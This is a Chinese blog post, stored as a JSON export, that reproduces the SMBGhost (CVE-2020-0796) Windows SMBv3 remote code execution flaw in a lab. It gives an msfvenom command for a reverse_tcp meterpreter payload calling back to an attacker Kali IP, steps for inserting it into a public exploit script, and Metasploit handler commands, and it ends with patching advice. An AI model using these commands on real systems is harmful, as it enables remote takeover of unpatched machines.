{"title":"CVE-2020-0796(SMBv3)漏洞复现获取shell","uid":"b71039d1ee333271a32a16dbb42e0da6","slug":"bba240d90d3a4db385c6fa9fea1d7895","date":"2024-08-12T11:45:47.929Z","updated":"2024-08-13T02:31:39.101Z","comments":true,"path":"api/articles/bba240d90d3a4db385c6fa9fea1d7895.json","keywords":null,"cover":[],"content":"<h2 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a><strong>漏洞介绍</strong></h2><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p>\n<h2 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a><strong>漏洞发现</strong></h2><p>扫描有漏洞的IP</p>\n<p><a href=\"http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip\">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>\n<p><img src=\"/resources/d3750e05b51646b580bf64ead213465d.png\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a><strong>漏洞利用</strong></h2><p>1、EXP脚本下载，下载后，利用kali生成反弹shell的shellcode <a href=\"https://github.com/chompie1337/SMBGhost_RCE_PoC.git\">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a></p>\n<p>&#x2F;&#x2F;  20.143为Kali的IP</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.20.143 lport&#x3D;4444 -f py -o exp.py</p></blockquote>\n<p><img src=\"/resources/7937d0c36cf44e6bbd5e09c843dc32b2.png\"></p>\n<p>2、编辑 exp.py文件，将buf替换成USER_PAYLOAD</p>\n<p><img src=\"/resources/881839f9d0f4496aa23fbce5fe76fe33.png\"></p>\n<p>3、再打开exploit.py，将USER_PAYLOAD部分全部替换成 exp.py口的USER_PAYLOAD部分，如图红框内全部替换</p>\n<p><img src=\"/resources/40f9138c445d4c88adc42e0a086ee737.png\"></p>\n<p><img src=\"/resources/617c07ec9b7c41b88f8d6d410b051129.png\"></p>\n<p>4、打开msf，监听本地kali 4444端口，设置本地kali的IP</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>root@kali:~# msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set lport 4444<br>set lhost 192.168.20.143<br>run</p></blockquote>\n<p><img src=\"/resources/7673e5aed43e4bef9d4139e19fc7430e.png\"></p>\n<p>5、运行exploit.py脚本，反弹shell</p>\n<p><img src=\"/resources/8b693d3c8d02482a98568e895d245166.png\"></p>\n<p>6、此时，已经获取到shell</p>\n<p><img src=\"/resources/89d6c86ce92d49789b5e72b9ac34161a.png\"></p>\n<p><img src=\"/resources/bf9b4944292149398e9bf08aa17ef756.png\"></p>\n<p>另一台：</p>\n<p><img src=\"/resources/391038f76a9e42469a55e1e63c9cc46f.png\"></p>\n<h3 id=\"修复方法\"><a href=\"#修复方法\" class=\"headerlink\" title=\"修复方法\"></a><strong>修复方法</strong></h3><p>1、使用系统自带的windows update补丁更新服务，更新微软漏洞补丁（慢）； 2、使用360 、腾讯管家等工具修复漏洞（建议）；</p>\n<p>如长期未更新过，可能需要 <strong>更新完、重启、再更新、再重启，操作多次</strong> ，因为有些补丁有依赖关系。</p>\n","text":"漏洞介绍2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Di...","permalink":"/post/bba240d90d3a4db385c6fa9fea1d7895","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"漏洞复现及验证","slug":"漏洞复现及验证","count":35,"path":"api/categories/漏洞复现及验证.json"},{"name":"2021年","slug":"漏洞复现及验证/2021年","count":24,"path":"api/categories/漏洞复现及验证/2021年.json"}],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">漏洞介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">漏洞发现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">漏洞利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">修复方法</span></a></li></ol></li></ol>","author":{"name":"大秦嬴政","slug":"blog-author","avatar":"https://www.baidu.com/img/flexible/logo/pc/result@2.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"CVE-2014-0160 OpenSSL心脏滴血漏洞复现验证","uid":"8bfa6dc0b1fc706cac1c9bcb35ec4e8e","slug":"b4fa07e435e349df991e3e6fdfbdb64c","date":"2024-08-12T11:53:08.409Z","updated":"2024-08-13T02:32:43.489Z","comments":true,"path":"api/articles/b4fa07e435e349df991e3e6fdfbdb64c.json","keywords":null,"cover":[],"text":"一、漏洞介绍Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64K...","permalink":"/post/b4fa07e435e349df99